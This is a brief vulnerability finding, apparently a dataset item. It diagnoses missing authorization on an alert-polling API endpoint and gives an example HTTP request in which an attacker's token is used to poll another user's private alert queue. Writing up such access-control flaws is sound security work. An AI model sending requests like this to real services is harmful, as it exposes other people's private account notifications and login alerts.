diagnosis: The endpoint polls live alert notifications by userId from the path parameter without verifying that req.user.id matches req.params.userId. An attacker can long-poll another user's alert queue to intercept private account notifications and login alerts.
exploit_request:
GET /api/users/usr_target_director_44/live-alerts/poll HTTP/1.1
Host: notify.enterprise.com
Authorization: Bearer <attacker_jwt>
